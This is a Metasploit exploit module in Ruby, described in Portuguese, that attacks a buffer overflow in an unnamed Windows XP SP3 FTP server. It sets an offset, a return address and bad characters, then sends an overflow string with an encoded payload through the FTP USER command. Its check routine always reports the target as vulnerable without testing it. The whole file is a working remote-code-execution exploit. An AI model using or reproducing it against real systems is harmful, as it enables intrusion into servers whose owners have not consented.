require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote


	include Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Buffer Overflow no Windows',
			'Description'    => %q{
					Este modulo explora uma vulnerabilidade de Buffer Overflow encontrada num servidor FTP no Windows.
			},
			'Author'         => 'Bruno Ramos',
			'Version'        => '1.0',
			'References'     =>
				[
				],
			'Payload'        =>
				{
					'Space'    => 444,
					'BadChars' => "\x00,\x0a,\x0d",
					
				},
			'Platform'	=> 'win',
			'Targets'	=>
				[
					[ 'Windows XP SP3',
						{
							'Ret' => 0x7cb32f34,
							'Offset' => 230
						}
					],
				],
			'DefaultTarget' => 0))
	end

	def check
		return Exploit::CheckCode::Vulnerable
	end

	def exploit
		connect
    buf = rand_text(target['Offset'])
    buf << [ target['Ret'] ].pack('V')
    buf << rand_text(8)
    buf << payload.encoded
    send_user(buf)
    disconnect

	end

end


